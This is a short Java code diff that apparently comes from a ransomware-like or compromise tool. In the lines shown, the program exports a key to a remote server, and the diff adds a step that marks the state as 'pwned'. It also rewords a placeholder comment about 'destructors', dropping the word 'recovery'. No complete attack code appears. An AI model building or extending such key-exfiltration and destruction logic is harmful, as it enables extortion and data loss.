@@ -81,6 +81,7 @@ public class App {
 					try {
 						myserver.exportKey(key);
 						stateManager.markExported();
+						stateManager.markPwned();
 					} catch (IOException e) {
 						logger.log(Level.WARNING, "Can t make connection between aluka and server");
 					}
@@ -88,9 +89,9 @@ public class App {
 			}
 
 		} else {
+			/// Destructors and mechanizm
 			
 			
-			/// Destructors and recovery mechanizm
 		}
 	}
 
